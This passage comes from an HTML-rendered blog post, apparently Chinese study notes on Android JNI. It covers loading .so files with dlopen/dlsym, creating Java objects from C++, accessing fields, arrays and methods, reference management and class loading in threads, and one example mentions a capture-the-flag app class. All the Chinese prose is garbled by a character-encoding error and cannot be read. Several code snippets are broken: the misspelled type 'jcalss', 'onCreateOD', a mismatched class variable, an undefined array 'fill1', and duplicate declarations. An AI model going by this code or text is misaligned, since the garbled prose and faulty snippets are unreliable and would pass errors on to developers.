&#123;</span><br><span class="line">            <span class="keyword">return</span> pi.applicationInfo.nativeLibraryDir;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="soä¹‹é—´çš„ç›¸äº’è°ƒç”¨â€“dlopen-dlsym">soä¹‹é—´çš„ç›¸äº’è°ƒç”¨â€“dlopen dlsym</h2><p>åœ¨è·å–åˆ°soè·¯å¾„å‰æä¸‹ï¼Œä½¿ç”¨dlopenåŠ è½½åŠ è½½è¿™ä¸ªsoæ–‡ä»¶è·¯å¾„</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//javaæ–‡ä»¶ä¸­</span></span><br><span class="line"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">onCreate</span><span class="params">(Bundle savedInstanceState)</span> &#123;</span><br><span class="line">       ......</span><br><span class="line">        String path=getPath(getApplicationContext())+<span class="string">&quot;/libxiaojianbangB.so&quot;</span>;</span><br><span class="line">        Log.d(<span class="string">&quot;zxk1ng&quot;</span>,getPath(getApplicationContext()));</span><br><span class="line">  ......</span><br><span class="line">    &#125;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">native</span> String <span class="title function_">stringFromJNI</span><span class="params">(String path)</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> String <span class="title function_">getPath</span><span class="params">(Context cxt)</span>&#123;</span><br><span class="line">        <span class="type">PackageManager</span> <span class="variable">pm</span> <span class="operator">=</span> cxt.getPackageManager();</span><br><span class="line">        List&lt;PackageInfo&gt; pkgList = pm.getInstalledPackages(<span class="number">0</span>);</span><br><span class="line">        <span class="keyword">if</span>(pkgList == <span class="literal">null</span> || pkgList.size() == <span class="number">0</span>) <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">        <span class="keyword">for</span>(PackageInfo pi : pkgList)&#123;</span><br><span class="line">            <span class="keyword">if</span> (pi.applicationInfo.nativeLibraryDir.startsWith(<span class="string">&quot;/data/app/&quot;</span>) &amp;&amp; pi. packageName.startsWith(<span class="string">&quot;com.example.ndk_demo&quot;</span>)) &#123;</span><br><span class="line">                <span class="keyword">return</span> pi.applicationInfo.nativeLibraryDir;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//cppæ–‡ä»¶ä¸­</span></span><br><span class="line">extern <span class="string">&quot;C&quot;</span> JNIEXPORT jstring JNICALL</span><br><span class="line"><span class="title function_">Java_com_example_ndk_1demo_MainActivity_stringFromJNI</span><span class="params">(</span></span><br><span class="line"><span class="params">        JNIEnv* env,</span></span><br><span class="line"><span class="params">        jobject <span class="comment">/* this */</span>,jstring path)</span> &#123;</span><br><span class="line">    std::<span class="type">string</span> <span class="variable">hello</span> <span class="operator">=</span> <span class="string">&quot;Hello from C++&quot;</span>;</span><br><span class="line">    const <span class="type">char</span> *cPath = env-&gt;GetStringUTFChars(path,nullptr);</span><br><span class="line">    <span class="keyword">void</span> *soinfo = dlopen(cPath,RTLD_NOW );</span><br><span class="line">    <span class="keyword">void</span> (*ref)();   <span class="comment">//å‡½æ•°æŒ‡é’ˆ</span></span><br><span class="line">    ref=reinterpret_cast&lt;<span class="keyword">void</span> (*) () &gt;(dlsym(soinfo,<span class="string">&quot;fromSoB&quot;</span>));</span><br><span class="line">    <span class="keyword">if</span>(ref==nullptr)&#123;</span><br><span class="line">        LOGD(<span class="string">&quot;ref if null&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    ref(); <span class="comment">//è°ƒç”¨</span></span><br><span class="line">    dlclose(soinfo); <span class="comment">//å…³é—­so</span></span><br><span class="line">    <span class="keyword">return</span> env-&gt;NewStringUTF(hello.c_str());<span class="comment">//.c_strï¼šc++å­—ç¬¦ä¸²è½¬åŒ–cå­—ç¬¦ä¸²</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="soä¹‹é—´ç›¸äº’è°ƒç”¨â€“ä¸åŒsoæ–‡ä»¶é‡Œçš„å‡½æ•°ç›¸äº’è°ƒç”¨">soä¹‹é—´ç›¸äº’è°ƒç”¨â€“ä¸åŒsoæ–‡ä»¶é‡Œçš„å‡½æ•°ç›¸äº’è°ƒç”¨</h2><p>CMakeListsåšå¦‚ä¸‹ä¿®æ”¹</p><p><img src="/posts/f0867805.htm/image-20240204224426093.png" alt="image-20240204224426093"></p><p>è¯´æ˜libdemo.soæ–‡ä»¶ä¸­çš„å‡½æ•°å°†è¦åœ¨libndk_demo.soä¸­è¢«è°ƒç”¨ä½¿ç”¨</p><h2 id="é€šè¿‡jniåˆ›å»ºJavaå¯¹è±¡">é€šè¿‡jniåˆ›å»ºJavaå¯¹è±¡</h2><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//NewObjectåˆ›å»ºå¯¹è±¡</span></span><br><span class="line">jclass clazz = env-&gt;<span class="built_in">FindClass</span>(<span class="string">&quot;com/example/javaandso/NDKDemo&quot;</span>);</span><br><span class="line">jmethodID methodID = env-&gt;<span class="built_in">GetMethodID</span>(clazz, <span class="string">&quot;&lt;init&gt;&quot;</span>, <span class="string">&quot;()V&quot;</span>);</span><br><span class="line">jobject ReflectDemoObj = env-&gt;<span class="built_in">NewObject</span>(clazz, methodID);</span><br><span class="line"><span class="built_in">LOGD</span>(<span class="string">&quot;ReflectDemoObj %p&quot;</span>, ReflectDemoObj);</span><br><span class="line"></span><br><span class="line"><span class="comment">//AllocObjectåˆ›å»ºå¯¹è±¡</span></span><br><span class="line">jclass clazz2 = env-&gt;<span class="built_in">FindClass</span>(<span class="string">&quot;com/example/javaandso/NDKDemo&quot;</span>);</span><br><span class="line">jmethodID methodID2 = env-&gt;<span class="built_in">GetMethodID</span>(clazz2, <span class="string">&quot;&lt;init&gt;&quot;</span>, <span class="string">&quot;(Ljava/lang/String;I)V&quot;</span>);</span><br><span class="line">jobject ReflectDemoObj2 = env-&gt;<span class="built_in">AllocObject</span>(clazz2);   <span class="comment">//ç›¸å½“äºè·å–ç©ºé—´</span></span><br><span class="line">jstring jstr = env-&gt;<span class="built_in">NewStringUTF</span>(<span class="string">&quot;from jni str&quot;</span>);</span><br><span class="line">env-&gt;<span class="built_in">CallNonvirtualVoidMethod</span>(ReflectDemoObj2, clazz2, methodID2, jstr, <span class="number">100</span>);</span><br></pre></td></tr></table></figure><h2 id="é€šè¿‡jniè®¿é—®Javaå±æ€§">é€šè¿‡jniè®¿é—®Javaå±æ€§</h2><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//è·å–é™æ€å­—æ®µ</span></span><br><span class="line">jclass clazz = env-&gt;<span class="built_in">FindClass</span>(<span class="string">&quot;com/example/javaandso/NDKDemo&quot;</span>);</span><br><span class="line">jfieldID privateStaticStringField =</span><br><span class="line">            env-&gt;<span class="built_in">GetStaticFieldID</span>(clazz, <span class="string">&quot;privateStaticStringField&quot;</span>, <span class="string">&quot;Ljava/lang/String;&quot;</span>);</span><br><span class="line">jstring privateStaticString =</span><br><span class="line">            <span class="built_in">static_cast</span>&lt;jstring&gt;(env-&gt;<span class="built_in">GetStaticObjectField</span>(clazz, privateStaticStringField));</span><br><span class="line"><span class="type">const</span> <span class="type">char</span>* privatecstr =</span><br><span class="line">            env-&gt;<span class="built_in">GetStringUTFChars</span>(privateStaticString, <span class="literal">nullptr</span>);</span><br><span class="line"><span class="built_in">LOGD</span>(<span class="string">&quot;privateStaticString: %s&quot;</span>, privatecstr);</span><br><span class="line">env-&gt;<span class="built_in">ReleaseStringUTFChars</span>(privateStaticString, privatecstr);</span><br><span class="line"></span><br><span class="line"><span class="comment">//è·å–å¯¹è±¡å­—æ®µ</span></span><br><span class="line">jclass clazz = env-&gt;<span class="built_in">FindClass</span>(<span class="string">&quot;com/example/javaandso/NDKDemo&quot;</span>);</span><br><span class="line">jmethodID methodID = env-&gt;<span class="built_in">GetMethodID</span>(clazz, <span class="string">&quot;&lt;init&gt;&quot;</span>, <span class="string">&quot;()V&quot;</span>);</span><br><span class="line">jobject ReflectDemoObj = env-&gt;<span class="built_in">NewObject</span>(clazz, methodID);</span><br><span class="line"></span><br><span class="line">jfieldID publicStringField =</span><br><span class="line">            env-&gt;<span class="built_in">GetFieldID</span>(clazz, <span class="string">&quot;publicStringField&quot;</span>, <span class="string">&quot;Ljava/lang/String;&quot;</span>);</span><br><span class="line">jstring publicString =</span><br><span class="line">            <span class="built_in">static_cast</span>&lt;jstring&gt;(env-&gt;<span class="built_in">GetObjectField</span>(ReflectDemoObj, publicStringField));</span><br><span class="line"><span class="type">const</span> <span class="type">char</span>* publiccstr = env-&gt;<span class="built_in">GetStringUTFChars</span>(publicString, <span class="literal">nullptr</span>);</span><br><span class="line"><span class="built_in">LOGD</span>(<span class="string">&quot;publicStringField: %s&quot;</span>, publiccstr);</span><br><span class="line">env-&gt;<span class="built_in">ReleaseStringUTFChars</span>(publicString, publiccstr);</span><br><span class="line"></span><br><span class="line"><span class="comment">//è®¾ç½®å­—æ®µ å…ˆæŒ‡å®šåˆ°è¿™ä¸ªå­—æ®µï¼Œåœ¨è®¾ç½®</span></span><br><span class="line"> jfieldID privateStringFieldID =</span><br><span class="line">            env-&gt;<span class="built_in">GetFieldID</span>(clazz, <span class="string">&quot;privateStringField&quot;</span>, <span class="string">&quot;Ljava/lang/String;&quot;</span>);</span><br><span class="line"></span><br><span class="line">jstring privateString =</span><br><span class="line">            <span class="built_in">static_cast</span>&lt;jstring&gt;(env-&gt;<span class="built_in">GetObjectField</span>(ReflectDemoObj, privateStringFieldID));</span><br><span class="line"></span><br><span class="line">env-&gt;<span class="built_in">SetObjectField</span>(ReflectDemoObj, privateStringFieldID, env-&gt;<span class="built_in">NewStringUTF</span>(<span class="string">&quot;zxk1ng&quot;</span>));</span><br><span class="line">`</span><br><span class="line">privateString = <span class="built_in">static_cast</span>&lt;jstring&gt;(env-&gt;<span class="built_in">GetObjectField</span>(ReflectDemoObj, privateStringFieldID));</span><br><span class="line">privateCstr = env-&gt;<span class="built_in">GetStringUTFChars</span>(privateString, <span class="literal">nullptr</span>);</span><br><span class="line"><span class="built_in">LOGD</span>(<span class="string">&quot;privateStringField new: %s&quot;</span>, privateCstr);</span><br><span class="line">env-&gt;<span class="built_in">ReleaseStringUTFChars</span>(privateString, privateCstr);</span><br></pre></td></tr></table></figure><h2 id="é€šè¿‡jniè®¿é—®æ•°ç»„">é€šè¿‡jniè®¿é—®æ•°ç»„</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//è·å–æ•°ç»„å­—æ®µ</span></span><br><span class="line"><span class="type">jfieldID</span> <span class="variable">byteArrayID</span> <span class="operator">=</span> env-&gt;GetFieldID(clazz, <span class="string">&quot;byteArray&quot;</span>, <span class="string">&quot;[B&quot;</span>);</span><br><span class="line"><span class="type">jbyteArray</span> <span class="variable">byteArray</span> <span class="operator">=</span> static_cast&lt;jbyteArray&gt;(env-&gt;GetObjectField(ReflectDemoObj, byteArrayID));</span><br><span class="line"><span class="type">int</span> <span class="variable">_byteArrayLength</span> <span class="operator">=</span> env-&gt;GetArrayLength(byteArray);  <span class="comment">//è·å–é•¿åº¦</span></span><br><span class="line">jbyte* CBytes = env-&gt;GetByteArrayElements(byteArray, nullptr);</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; _byteArrayLength; i++) &#123;</span><br><span class="line">    LOGD(<span class="string">&quot;jbyteArray: %d&quot;</span>, CBytes[i]);</span><br><span class="line">&#125;    </span><br><span class="line">    </span><br><span class="line"><span class="comment">//ä¿®æ”¹æ•°ç»„å­—æ®µ</span></span><br><span class="line"><span class="type">char</span> javaByte[<span class="number">10</span>];</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; <span class="number">10</span>; i++)&#123;</span><br><span class="line">    javaByte[i] = static_cast&lt;<span class="type">char</span>&gt;(<span class="number">100</span> - i);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">const jbyte *java_array = reinterpret_cast&lt;const jbyte *&gt;(javaByte);</span><br><span class="line">env-&gt;SetByteArrayRegion(byteArray, <span class="number">0</span>, _byteArrayLength, java_array);</span><br><span class="line"></span><br><span class="line">byteArray = static_cast&lt;jbyteArray&gt;(env-&gt;GetObjectField(ReflectDemoObj, byteArrayID));</span><br><span class="line">_byteArrayLength = env-&gt;GetArrayLength(byteArray);</span><br><span class="line">jbyte* CBytes = env-&gt;GetByteArrayElements(byteArray, nullptr);</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; _byteArrayLength; i++) &#123;</span><br><span class="line">    LOGD(<span class="string">&quot;jbyteArray: %d&quot;</span>, CBytes[i]);      </span><br><span class="line">&#125;</span><br><span class="line">env-&gt;ReleaseByteArrayElements(byteArray, CBytes, <span class="number">0</span>);</span><br></pre></td></tr></table></figure><h2 id="é€šè¿‡jniè®¿é—®æ–¹æ³•">é€šè¿‡jniè®¿é—®æ–¹æ³•</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//è°ƒç”¨é™æ€æ–¹æ³•</span></span><br><span class="line"><span class="type">jclass</span> <span class="variable">clazz</span> <span class="operator">=</span> env-&gt;FindClass(<span class="string">&quot;com/example/javaandso/NDKDemo&quot;</span>);</span><br><span class="line"><span class="type">jmethodID</span> <span class="variable">publicStaticFuncID</span> <span class="operator">=</span></span><br><span class="line">            env-&gt;GetStaticMethodID(clazz, <span class="string">&quot;publicStaticFunc&quot;</span>, <span class="string">&quot;()V&quot;</span>);</span><br><span class="line"> env-&gt;CallStaticVoidMethod(clazz, publicStaticFuncID);</span><br><span class="line"></span><br><span class="line"><span class="comment">//è°ƒç”¨åŠ¨æ€æ–¹æ³• å…ˆåˆ›å»ºå¯¹è±¡ï¼Œç„¶åï¼š</span></span><br><span class="line"><span class="type">jmethodID</span> <span class="variable">privateFuncID</span> <span class="operator">=</span></span><br><span class="line">            env-&gt;GetMethodID(clazz, <span class="string">&quot;privateFunc&quot;</span>, <span class="string">&quot;(Ljava/lang/String;I)Ljava/lang/String;&quot;</span>);</span><br><span class="line">    <span class="type">jstring</span> <span class="variable">str1</span> <span class="operator">=</span> env-&gt;NewStringUTF(<span class="string">&quot;this is from JNI&quot;</span>);</span><br><span class="line">    <span class="type">jstring</span> <span class="variable">retval_jstring</span> <span class="operator">=</span> static_cast&lt;jstring&gt;(env-&gt;CallObjectMethod(ReflectDemoObj, privateFuncID, str1, <span class="number">1000</span>));</span><br><span class="line"></span><br><span class="line">    const <span class="type">char</span>* retval_cstr = env-&gt;GetStringUTFChars(retval_jstring, nullptr);</span><br><span class="line">    LOGD(<span class="string">&quot;privateStaticString: %s&quot;</span>, retval_cstr);</span><br><span class="line">    env-&gt;ReleaseStringUTFChars(retval_jstring, retval_cstr);</span><br></pre></td></tr></table></figure><p>2ï¼‰CallVoidMethodä¸CallVoidMethodVçš„åŒºåˆ«æ˜¯ï¼šCallVoidMethodå¯ä»¥ä¼ å…¥å¤šä¸ªå‚æ•°ï¼ŒCallVoidMethodVåªèƒ½ä¼ å…¥ä¸€ä¸ªå‚æ•°ï¼Œè¦è‡ªå·±å¤„ç†å‚æ•°</p><p>CallVoidMethodA</p><p>jvalueç›¸å½“äºä¸€ä¸ªç»“æ„ä½“ï¼Œå¯ä»¥æŒ‡å®šç±»å‹</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">jstring</span> <span class="variable">str2</span> <span class="operator">=</span> env-&gt;NewStringUTF(<span class="string">&quot;this is from JNI2&quot;</span>);</span><br><span class="line">jvalue args[<span class="number">2</span>];</span><br><span class="line">args[<span class="number">0</span>].l = str2;  <span class="comment">//0å·å­˜å…¥jobjectç±»å‹æ•°æ®</span></span><br><span class="line">args[<span class="number">1</span>].i = <span class="number">1000</span>;  <span class="comment">//1å·å­˜å…¥intç±»å‹æ•°æ®</span></span><br><span class="line"></span><br><span class="line"><span class="type">jstring</span> <span class="variable">retval</span> <span class="operator">=</span> static_cast&lt;jstring&gt;(env-&gt;CallObjectMethodA(ReflectDemoObj, privateFuncID, args));</span><br><span class="line">const <span class="type">char</span>* cpp_retval = env-&gt;GetStringUTFChars(retval, nullptr);</span><br><span class="line">LOGD(<span class="string">&quot;cpp_retval: %s&quot;</span>, cpp_retval);</span><br><span class="line">env-&gt;ReleaseStringUTFChars(retval, cpp_retval);</span><br></pre></td></tr></table></figure><p>3ï¼‰å‚æ•°æ˜¯æ•°ç»„String[] è¿”å›å€¼æ˜¯æ•°ç»„int[]</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// String strArr[] = new String[3];</span></span><br><span class="line"><span class="type">jclass</span> <span class="variable">StringClazz</span> <span class="operator">=</span> env-&gt;FindClass(<span class="string">&quot;java/lang/String&quot;</span>);</span><br><span class="line"><span class="type">jobjectArray</span> <span class="variable">StringArr</span> <span class="operator">=</span> env-&gt;NewObjectArray(<span class="number">3</span>, StringClazz, nullptr);</span><br><span class="line"></span><br><span class="line"><span class="comment">//    for(int i = 0; i &lt; 3; i++)&#123;</span></span><br><span class="line"><span class="comment">//        strArr[i] = &quot;NDK&quot;;</span></span><br><span class="line"><span class="comment">//    &#125;</span></span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; <span class="number">3</span>; i++)&#123;</span><br><span class="line"><span class="type">jstring</span> <span class="variable">str3</span> <span class="operator">=</span> env-&gt;NewStringUTF(<span class="string">&quot;NDK&quot;</span>);</span><br><span class="line">env-&gt;SetObjectArrayElement(StringArr, i, str3);</span><br><span class="line">    <span class="comment">//env-&gt;DeleteLocalRef(str3);</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="type">jmethodID</span> <span class="variable">privateStaticFuncID</span> <span class="operator">=</span> env-&gt;GetStaticMethodID(clazz, <span class="string">&quot;privateStaticFunc&quot;</span>, <span class="string">&quot;([Ljava/lang/String;)[I&quot;</span>);</span><br><span class="line"><span class="type">jintArray</span> <span class="variable">intArr</span> <span class="operator">=</span> static_cast&lt;jintArray&gt;(env-&gt;CallStaticObjectMethod(clazz, privateStaticFuncID, StringArr));</span><br><span class="line"><span class="type">int</span> *cintArr = env-&gt;GetIntArrayElements(intArr, nullptr);</span><br><span class="line"> LOGD(<span class="string">&quot;cintArr[9]=%d&quot;</span>, cintArr[<span class="number">9</span>]);</span><br><span class="line">env-&gt;ReleaseIntArrayElements(intArr, cintArr, JNI_ABORT);</span><br></pre></td></tr></table></figure><p>å½“åœ¨NDKä¸­è°ƒç”¨javaå±‚ä¸€ä¸ªå‡½æ•°ï¼šä¸”å‡½æ•°æ ¼å¼ä¸ºï¼švoid func(int [] data)</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">jintArray</span> <span class="variable">jArray1</span> <span class="operator">=</span> env-&gt;NewIntArray(<span class="number">16</span>);</span><br><span class="line">jint fill[<span class="number">16</span>]=&#123;æ•°æ®&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">jclass</span> <span class="variable">clazz</span> <span class="operator">=</span> env-&gt;FindClass(<span class="string">&quot;com/hectf2024/ezandroid/CheckActivity&quot;</span>);</span><br><span class="line"><span class="type">jmethodID</span> <span class="variable">methodID</span> <span class="operator">=</span> env-&gt;GetMethodID(clazz, <span class="string">&quot;&lt;init&gt;&quot;</span>, <span class="string">&quot;()V&quot;</span>);</span><br><span class="line"><span class="type">jobject</span> <span class="variable">ReflectDemoObj</span> <span class="operator">=</span> env-&gt;NewObject(clazz, methodID);</span><br><span class="line"><span class="type">jmethodID</span> <span class="variable">privateFuncID</span> <span class="operator">=</span></span><br><span class="line">        env-&gt;GetMethodID(clazz, <span class="string">&quot;func&quot;</span>, <span class="string">&quot;([I)Ljava/lang/String;&quot;</span>);</span><br><span class="line"></span><br><span class="line">env-&gt;SetIntArrayRegion(jArray1, <span class="number">0</span>, <span class="number">16</span>, fill1);</span><br><span class="line">(env-&gt;CallVoidMethod(ReflectDemoObj, privateFuncID, jArray1));</span><br></pre></td></tr></table></figure><h2 id="é€šè¿‡jniè®¿é—®Javaçˆ¶ç±»æ–¹æ³•">é€šè¿‡jniè®¿é—®Javaçˆ¶ç±»æ–¹æ³•</h2><p>nativeå®ç°onCreateä¸­çš„ super.onCreate()</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">extern <span class="string">&quot;C&quot;</span></span><br><span class="line">JNIEXPORT <span class="keyword">void</span> JNICALL</span><br><span class="line"><span class="title function_">Java_com_example_ndk_1demo_MainActivity_onCreate</span><span class="params">(JNIEnv *env, jobject thiz,</span></span><br><span class="line"><span class="params">                                                 jobject saved_instance_state)</span> &#123;</span><br><span class="line">    jcalss AppCompatActivityClazz=</span><br><span class="line">        env-&gt;FindClass(<span class="string">&quot;androidx/appcompat/app/AppCompatActivity&quot;</span>);</span><br><span class="line">    jmethodID onCreateID=</span><br><span class="line">        env-&gt;GetMethodID(AppCompatActivity,<span class="string">&quot;onCreate&quot;</span>,<span class="string">&quot;(Landroid/os/Bundle;)V&quot;</span>);</span><br><span class="line">    env-&gt;CallNonvirtualVoidMethod(thiz,AppCompatActivity,onCreateOD,saved_instance_state);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="å†…å­˜ç®¡ç†">å†…å­˜ç®¡ç†</h2><p>1.å±€éƒ¨å¼•ç”¨</p><p>å¤§å¤šæ•°çš„jniå‡½æ•°è°ƒç”¨ä»¥åè¿”å›çš„ç»“æœéƒ½æ˜¯å±€éƒ¨å¼•ç”¨ã€‚ä¸€ä¸ªå‡½æ•°å†…éƒ¨çš„å±€éƒ¨å¼•ç”¨çš„æ•°é‡æ˜¯æœ‰é™çš„ï¼Œå½“å‡½æ•°ä½“å†…éœ€è¦å¤§é‡ä½¿ç”¨å±€éƒ¨å¼•ç”¨æ—¶ï¼Œæœ€å¥½åŠæ—¶åˆ é™¤ä¸ç”¨çš„å±€éƒ¨å¼•ç”¨ï¼Œå¯ä»¥ä½¿ç”¨env-&gt;DeleteLocalRefæ¥åˆ é™¤å±€éƒ¨å¼•ç”¨ã€‚</p><p>1.1å±€éƒ¨å¼•ç”¨ç›¸å…³å…¶ä»–å‡½æ•°</p><p>env-&gt;EnsureLocalCapacity(num)ï¼šåˆ¤æ–­æ˜¯å¦æœ‰è¶³å¤Ÿçš„å±€éƒ¨å¼•ç”¨å¯ä»¥ä½¿ç”¨ï¼Œè¶³å¤Ÿåˆ™è¿”å›0ï¼Œéœ€è¦å¤§é‡ä½¿ç”¨å±€éƒ¨å¼•ç”¨æ—¶ï¼Œæ‰‹åŠ¨åˆ é™¤å¤ªéº»çƒ¦ï¼Œå¯ä½¿ç”¨ä»¥ä¸‹ä¸¤ä¸ªå‡½æ•°æ¥æ‰¹é‡ç®¡ç†å±€éƒ¨å¼•ç”¨</p><p>env-&gt;PushLocalFrame(num)</p><p>env-&gt;PopLocalFrame(nullptr)</p><p>2.å…¨å±€å¼•ç”¨</p><p>åœ¨ jni å¼€å‘ä¸­ï¼Œéœ€è¦è·¨å‡½æ•°ä½¿ç”¨å˜é‡æ—¶ï¼Œç›´æ¥å®šä¹‰å…¨å±€å˜é‡æ˜¯æ²¡ç”¨çš„éœ€è¦ä½¿ç”¨ä»¥ä¸‹ä¸¤ä¸ªæ–¹æ³•ï¼Œ</p><p>env-&gt;NewGlobalRef</p><p>env-&gt;DeleteGlobalRef</p><p>3.å¼±å…¨å±€å¼•ç”¨</p><p>ä¸å…¨å±€å¼•ç”¨åŸºæœ¬ç›¸åŒï¼ŒåŒºåˆ«æ˜¯å¼±å…¨å±€å¼•ç”¨æœ‰å¯èƒ½ä¼šè¢«å›æ”¶</p><p>env-&gt;NewWeakGlobalRef</p><p>env-&gt;DeleteWeakGlobalRef</p><h2 id="å­çº¿ç¨‹ä¸­è·å–javaç±»">å­çº¿ç¨‹ä¸­è·å–javaç±»</h2><p>1ï¼‰åœ¨å­çº¿ç¨‹ä¸­ï¼ŒfindClasså¯ä»¥ç›´æ¥è·å–ç³»ç»Ÿç±»</p><p>2ï¼‰åœ¨ä¸»çº¿ç¨‹ä¸­è·å–ç±»ï¼Œä½¿ç”¨å…¨å±€å¼•ç”¨æ¥ä¼ é€’åˆ°å­çº¿ç¨‹ä¸­</p><p>3ï¼‰åœ¨ä¸»çº¿ç¨‹ä¸­è·å–æ­£ç¡®çš„ClassLoaderï¼Œåœ¨å­çº¿ç¨‹ä¸­å»åŠ è½½ç±»</p><p>â€‹3.1åœ¨Javaä¸­ï¼Œå¯ä»¥å…ˆè·å–ç±»å­—èŠ‚ç ï¼Œç„¶åä½¿ç”¨getClassLoader()è·å–</p><p>â€‹Demo. class. getClassLoader()</p><p>â€‹new Demo().getClass(). getClassLoader()</p><p>â€‹Class.forName(ç±»è·¯å¾„).getClassLoader()</p><p>â€‹3.2 åœ¨jniçš„ä¸»çº¿ç¨‹ä¸­è·å–ClassLoader</p><p>â€‹3.3 åœ¨jniçš„å­çº¿ç¨‹ä¸­è·å–loadClass</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span 